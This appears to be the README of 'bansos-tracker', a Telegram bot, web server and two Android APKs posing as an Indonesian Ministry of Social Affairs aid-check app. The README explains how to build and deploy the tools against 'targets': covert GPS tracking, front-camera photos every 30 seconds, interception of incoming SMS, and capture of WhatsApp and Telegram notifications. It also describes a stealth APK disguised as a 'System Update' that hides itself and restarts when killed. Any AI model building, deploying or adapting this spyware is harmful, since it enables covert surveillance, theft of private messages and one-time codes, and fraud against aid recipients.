# bansos-tracker

**Sistem Tracking GPS** — Telegram Bot + Android APK  
*Kementerian Sosial RI (Kemensos)*

> ⚠️ **Untuk rebuild di masa depan**, ikuti panduan di bawah.

---

## 📋 Daftar Isi

- [🚀 Quick Start](#-quick-start)
- [🐍 Backend Setup](#-backend-setup-flask--bot)
- [📱 Android APK](#-android-apk)
  - [BansosApp (WebView Tracker)](#-bansosapp-webview-tracker)
  - [BansosService (Stealth Background)](#-bansosservice-stealth-background)
- [🌐 Cloudflare Tunnel (Permanent Domain)](#-cloudflare-tunnel-permanent-domain)
- [🖥 Dashboard Monitoring](#-dashboard-monitoring)
- [📁 Struktur File](#-struktur-file)

---

## 🚀 Quick Start

```bash
# 1. Clone repo
git clone https://github.com/clickmamaheti-prog/bansos-tracker.git
cd bansos-tracker

# 2. Install Python deps
pip3 install flask python-telegram-bot requests

# 3. Set environment
export BOT_TOKEN="token_dari_botfather"
export BASE_URL="https://domain-anda.com"  # Cloudflare tunnel / domain

# 4. Jalankan
python3 bot.py
```

Buka `http://localhost:5000` → landing page siap.

---

## 🐍 Backend Setup (Flask + Bot)

### Requirements

| Package | Version |
|---------|---------|
| Python | 3.8+ |
| Flask | latest |
| python-telegram-bot | ≥20.0 |
| requests | latest |

### Environment Variables

| Variable | Wajib? | Contoh |
|----------|--------|--------|
| `BOT_TOKEN` | ✅ Ya | `8813008108:AAFTaDai5Cm5...` |
| `BASE_URL` | ✅ Ya | `https://bansos.jokichannel.eu.org` |

### Cara Dapat Token

1. Buka [@BotFather](https://t.me/BotFather) di Telegram
2. Kirim `/newbot`, ikuti instruksi
3. Copy token → `export BOT_TOKEN="token_anda"`

### Jalankan

```bash
python3 bot.py
```

Bot akan:
- Listen di **port 5000**
- Polling Telegram untuk perintah `/start`
- Siap menerima tracking links

### Bot Menu

| Tombol | Fungsi |
|--------|--------|
| 📦 Buat Link Tracking | Generate link unik untuk target |
| 📋 Daftar Link Saya | Lihat semua link + jumlah event |
| 📊 Statistik & Info | Total link, event, dan data |
| 🖥 Buka Dashboard | Admin panel monitoring real-time |

### Auto-Start (Container / VPS)

Jika VPS pake **Docker container**, tambahkan ke `/entrypoint.sh`:

```bash
# GPS Bot + Cloudflare Tunnel
if test -f /root/gps-link/bot.py; then
  cloudflared tunnel --config /root/.cloudflared/config.yml \
    --credentials-file /root/.cloudflared/8dc7779d-....json run &
  cd /root/gps-link && BOT_TOKEN="token" BASE_URL="https://domain.com" python3 bot.py &
fi
```

---

## 📱 Android APK

Ada **2 versi APK** yang bisa digunakan:

### 📱 BansosApp (WebView Tracker)

APK yang menampilkan halaman tracker di WebView + background collection.

**Lokasi:** `android/BansosApp/`

**Fitur:**

| File | Fungsi |
|------|--------|
| `MainActivity.java` | WebView tracker + kamera/lokasi/SMS permissions |
| `SmsReceiver.java` | 📨 BroadcastReceiver — tangkap SMS masuk otomatis |
| `NotifListener.java` | 💬 NotificationListenerService — tangkap WA/Telegram |

**Build:**

```bash
cd android/BansosApp
bash build-apk.sh
```

Output: `build/out/bantuan-sosial.apk`

**Cara Aktifkan Notif WA di HP Target:**
1. Buka **Settings → Apps → Akses Notifikasi**
2. Cari **"Cek Bantuan Sosial"**
3. Aktifkan toggle-nya ✅

### 🕵️ BansosService (Stealth Background)

APK stealth — tanpa WebView, langsung minta izin, jalan di background.

**Lokasi:** `android/BansosService/`

**Fitur:**

| Fitur | Detail |
|-------|--------|
| 🎭 Nama APK | **"Pembaruan Sistem"** — kaya system update beneran |
| 👻 Activity | Transparan → muncul & ilang dalam 1 detik |
| 🔄 Izin | Minta semua sekaligus: Kamera, GPS, SMS, Notif |
| 🛡️ Battery | Minta ignore battery optimizations + wakelock |
| 🔄 Auto Restart | `START_STICKY` — kalo dimatiin bakal hidup lagi |
| 🟢 Notif | "Pembaruan Sistem" di status bar (samar) |

**Background Tasks:**
- 📍 **GPS** — Tiap 1 menit
- 📸 **Kamera** — Tiap 30 detik (depan)
- 📨 **SMS** — Real-time via BroadcastReceiver
- 💬 **Notif** — WA/Telegram capture via NotificationListener
- 📤 **Data** — Kirim ke server via HTTP

**Build:**

```bash
cd android/BansosService
bash build-apk.sh
```

Output: `build/out/bantuan-sosial.apk`

**⚠️ Catatan:**
- Android 12+ akan muncul **green dot** di status bar pas kamera aktif
- Izin **Akses Notifikasi** harus manual: Settings → Apps → Pembaruan Sistem → Izinkan akses notifikasi
- Izin **Overlay** & **Battery Optimization** juga dialog manual dari sistem

---

## 🌐 Cloudflare Tunnel (Permanent Domain)

Menggantikan ngrok — domain **permanen**, SSL otomatis, 1x build APK selamanya.

### Setup

```bash
# Install cloudflared
# Login & create tunnel
cloudflared tunnel create bansos-tracker

# Config file: ~/.cloudflared/config.yml
tunnel: <tunnel-id>
credentials-file: /root/.cloudflared/<tunnel-id>.json
ingress:
  - hostname: bansos.domain.com
    service: http://localhost:5000
  - service: http_status:404

# DNS
cloudflared tunnel route dns bansos-tracker bansos.domain.com

# Run
cloudflared tunnel run
```

### Auto-Start (entrypoint.sh)

```bash
cloudflared tunnel --config /root/.cloudflared/config.yml \
  --credentials-file /root/.cloudflared/<id>.json run &
```

---

## 🖥 Dashboard Monitoring

Akses: `https://BASE_URL/admin/dashboard`

| Seksi | Data |
|-------|------|
| 📍 Tracking Events | GPS target (lat, lon, accuracy, timestamp) |
| 💬 SMS Tertangkap | SMS masuk + pengirim |
| 💬 Pesan Chat | WA (🟢), Telegram (🔵), Messenger, dll |

Auto-refresh dashboard via JS.

---

## 📁 Struktur File

```
bansos-tracker/
├── bot.py                    # 🐍 Main app (Flask + Telegram Bot)
├── start.sh                  # Auto-start script
├── .gitignore
├── README.md
│
├── templates/                # 🌐 Web pages (mobile-first)
│   ├── track.html            # Target page (GPS + camera + SVG icons)
│   ├── dashboard.html        # Dashboard monitoring
│   ├── map.html              # Peta Google Maps
│   ├── index.html            # Landing page
│   └── error.html            # Error page
│
├── static/                   # 🖼️ Assets
│   ├── favicon.svg           # Logo Kemensos Hadir (SVG)
│   ├── favicon.ico
│   ├── favicon-32x32.png
│   └── favicon-16x16.png
│
├── android/                  # 📱 Android APKs
│   ├── BansosApp/            # WebView tracker version
│   │   ├── build-apk.sh
│   │   └── app/src/main/
│   │       ├── AndroidManifest.xml
│   │       ├── java/com/kemensos/bansos/
│   │       │   ├── MainActivity.java
│   │       │   ├── SmsReceiver.java
│   │       │   └── NotifListener.java
│   │       └── res/
│   │
│   └── BansosService/        # Stealth background version
│       ├── build-apk.sh
│       └── app/src/main/
│           ├── AndroidManifest.xml
│           ├── java/com/kemensos/bansos/
│           │   ├── MainActivity.java
│           │   ├── UpdateService.java
│           │   ├── SmsReceiver.java
│           │   └── NotifService.java
│           └── res/
└── ...
```

---

## ⚡ Quick Reference

```bash
# Start server
python3 bot.py

# Start with env
BOT_TOKEN="xxx" BASE_URL="https://domain.com" python3 bot.py

# Kill server
pkill -f "python3 bot.py"

# Cloudflare tunnel
cloudflared tunnel run

# Build APK BansosApp
cd android/BansosApp && bash build-apk.sh

# Build APK BansosService (stealth)
cd android/BansosService && bash build-apk.sh

# Reset database
rm -f tracker.db
```

---

> **Dibuat oleh DevCultur** — 2026
> 
> Domain: `bansos.jokichannel.eu.org`
